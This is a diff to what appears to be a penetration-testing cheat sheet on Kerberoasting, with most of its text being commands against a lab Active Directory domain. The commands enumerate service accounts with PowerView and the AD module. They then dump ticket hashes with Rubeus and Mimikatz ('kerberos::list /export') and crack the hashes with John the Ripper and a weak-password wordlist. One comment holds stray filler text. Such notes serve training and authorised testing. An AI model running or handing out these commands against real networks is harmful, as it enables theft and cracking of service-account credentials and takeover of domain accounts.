@@ -5,8 +5,9 @@
 ---
 ```powershell
 # Standard AD User. Get Domain Users SPN. Users that are for services
-C:> . PowerView.ps1
+C:> . .\PowerView.ps1
 C:> Get-DomainUser -SPN
+# We require to use the 'serviceprincipalname'
 
 # Using AD Module
 C:> Get-ADUser -Filter {ServicePrincipalName ne ""$null ""} -Properties ServicePrincipalName
@@ -26,7 +27,7 @@ C:> Rubeus.exe kerberoast /user:<user> /simple /rc4opsec
 # Kerberoast all possible accounts
 C:> Rubeus.exe kerberoast /outfile:hashes.txt                  
 
-# Crack with John
+# Crack with John. Adequate file before cracking
 C:> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
 ```
 ##### Using Mimikatz
@@ -36,7 +37,7 @@ C:> Add-Type -AssemblyNAme System.IdentityModel
 C:> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken 
     -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
 
-# Dump account hashes to a `.kirbi` fileasd@service_asdasd
+# Dump account hashes to a `.kirbi` files: asd@service_asdasd
 C:> . .\Invoke-Mimikatz.ps1
 C:> Invoke-Mimikatz -Command '"kerberos::list /export"'
 
